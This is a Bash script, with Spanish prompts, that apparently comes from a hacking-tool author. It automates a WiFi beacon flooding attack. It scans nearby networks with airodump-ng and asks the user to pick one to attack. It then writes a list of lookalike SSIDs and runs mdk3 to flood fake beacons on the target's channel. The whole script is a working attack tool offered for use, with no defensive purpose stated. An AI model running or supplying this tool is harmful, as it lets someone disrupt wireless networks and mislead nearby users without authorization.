#!/bin/bash
# Author: 0xJuaNc4

# Paleta de colores ANSI
GREEN="\e[1;92m"
RED="\e[1;91m"
YELLOW="\e[1;93m"
CYAN="\e[1;96m"
RESET="\e[1;97m"

# Limpiar consola
clear

# Función salir del script
trap ctrl_c INT
stty -ctlecho
function ctrl_c(){
    echo -e "\n${RED}[!]${RESET} Saliendo...\n"
    if [[ -n "$xterm_pid" && -d "/proc/$xterm_pid" ]]; then
        kill "$xterm_pid"
    fi
    rm -f output-*.csv ssid_dict.txt &> /dev/null
    service wpa_supplicant start &> /dev/null
    exit 0
}

# Banner
banner(){
    echo -e "${GREEN}┏━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏━━┓╋╋╋╋╋╋╋╋┏┓"
    echo -e "┃┏┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┏┓┃╋╋╋╋╋╋╋┏┛┗┓"
    echo -e "┃┗┛┗┳━━┳━━┳━━┳━━┳━┓┃┗┛┗┳┓┏┳━┳━┻┓┏┛"
    echo -e "┃┏━┓┃┃━┫┏┓┃┏━┫┏┓┃┏┓┫┏━┓┃┃┃┃┏┫━━┫┃${RESET}    Hecho por ${YELLOW}0xJuaNc4${RESET}"
    echo -e "${GREEN}┃┗━┛┃┃━┫┏┓┃┗━┫┗┛┃┃┃┃┗━┛┃┗┛┃┃┣━━┃┗┓"
    echo -e "┗━━━┻━━┻┛┗┻━━┻━━┻┛┗┻━━━┻━━┻┛┗━━┻━┛${RESET}"
    sleep 1
}

# Comprobar si están instaladas las herramientas necesarias
check_tools(){
    tools=("iw" "airmon-ng" "airodump-ng" "mdk3" "xterm")
    echo -e "\n${CYAN}[*]${RESET} Comprobando herramientas necesarias...\n"
    for tool in "${tools[@]}"; do
        if command -v $tool &> /dev/null; then
            echo -e "$tool....${GREEN}ok${RESET}"
        else
            echo -e "$tool....${RED}no${RESET}"
            echo -e "\n${RED}[!]${RESET} La herramienta ${YELLOW}$tool${RESET} no se encuentra instalada en el sistema, debes instalarla para continuar\n"
        fi
        sleep 0.5
    done
}

# Listar interfaces de red disponibles
select_interface(){
    echo -e "\n${CYAN}[*]${RESET} Comenzando...\n"
    sleep 1
    echo -e "\n${CYAN}[*]${RESET} Interfaces de red inalámbricas disponibles:\n"
    interfaces=$(iw dev | grep Interface | awk '{print $2}')
    counter=1
    for interface in $interfaces; do
        echo -e "${YELLOW}${counter}.${RESET} ${interface}"
        ((counter++))
    done
    echo -n -e "\n${CYAN}Selecciona la interfaz con la que deseas trabajar >${RESET} "
    read interface
    if ! ifconfig "${interface}" &> /dev/null; then
        echo -e "\n\n${RED}[!]${RESET} La interfaz ${YELLOW}$interface${RESET} no es válida\n"
        exit 1
    else
        echo -e "\n\n${CYAN}[*]${RESET} Comprobando modo monitor en ${YELLOW}$interface${RESET}\n"
        sleep 1
        if ! iwconfig $interface | grep "Mode:Monitor" &> /dev/null; then
            echo -e "\n${RED}[!]${RESET} La interfaz ${YELLOW}$interface${RESET} no se encuentra en modo monitor, activalo para continuar...\n"
            exit 1
        else
            echo -e "\n${GREEN}[*]${RESET} Modo monitor activado en ${YELLOW}$interface${RESET}, continuando...\n"
        fi
    fi
}

# Mostrar la tabla del escaneo de redes
show_table(){
    clear
    banner
    echo -e "\n${CYAN}Redes disponibles:${RESET}\n"
    echo -e "--------------------------------------------------------------"
    echo -e "| BSSID              | ESSID               | Canal | Potencia |"
    echo -e "--------------------------------------------------------------"
    grep -E -o "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" output-01.csv | sort -u | while read -r bssid; do
        essid=$(grep "$bssid" output-01.csv | awk -F "," '{print $14}')
        channel=$(grep "$bssid" output-01.csv | awk -F "," '{print $4}')
        power=$(grep "$bssid" output-01.csv | awk -F "," '{print $8}')
        printf "| %-17s | %-20s | %-5s | %-8s |\n" "$bssid" "$essid" "$channel" "$power"
    done
    echo -e "--------------------------------------------------------------"
}

# Escanear las redes WIFI
net_scan(){
    echo -n -e "\n${CYAN}¿Deseas continuar con el escaneo de redes? ${YELLOW}(s/n)${RESET} >${RESET} "
    read option_choose
    if [[ "${option_choose,,}" == "s" ]]; then
        echo -e "\n\n${GREEN}[*]${RESET} Iniciando el escaneo de redes...\n"
        sleep 1
        clear
        banner
        echo -e "\n${YELLOW}[*]${RESET} Escaneo de redes en curso...\n"
        xterm -geometry 120x40 -e "airodump-ng ${interface} --output-format csv -w output"
        xterm_pid=$!
        wait "$xterm_pid"
        show_table
        echo -n -e "\n${CYAN}Escribe el nombre de la red WiFi a la que quieres atacar >${RESET} "
        read selected_essid
        if grep -q "$selected_essid" output-01.csv; then
            echo -e "\n${GREEN}[*]${RESET} La red ${YELLOW}$selected_essid${RESET} ha sido seleccionada.${RESET}\n"
            sleep 0.5
        else
            echo -e "\n${RED}[!]${RESET} La red ${YELLOW}$selected_essid${RESET} no se encuentra en la lista.${RESET}\n"
            echo -e "\n${RED}[!] Saliendo...${RESET}"
            exit 1 
        fi
    else
        echo -e "\n\n${RED}[!] Saliendo...${RESET}"
        exit 0
    fi
}

# Realizar ataque Beacon Flooding
beacon_attack(){
    selected_channel=$(grep "$selected_essid" output-01.csv | awk -F "," '{print $4}')
    echo -e "\n${CYAN}[*]${RESET} Creando diccionario de ataque para la red ${YELLOW}$selected_essid${RESET}\n"
    for i in $(seq 1 10); do
        echo "${selected_essid}${i}" >> ssid_dict.txt
    done
    sleep 1
    echo -e "\n${GREEN}[*]${RESET} Diccionario creado con exito!\n"
    clear
    banner
    echo -e "\n${CYAN}[*]${RESET} Ataque en curso a la red ${YELLOW}${selected_essid}${RESET} ${RED}(Ctrl + C)${RESET} para finalizar\n"
    mdk3 $interface b -f ssid_dict.txt -c $selected_channel -s 1000 -a
}

# Programa principal
if [ "$(id -u)" == "0" ]; then
    banner
    check_tools
    select_interface
    net_scan
    beacon_attack
else
    echo -e "\n${RED}[!]${RESET} Se requieren permisos de superusuario ${RED}(root)${RESET} para ejecutar el script\n"
    exit 1
fi
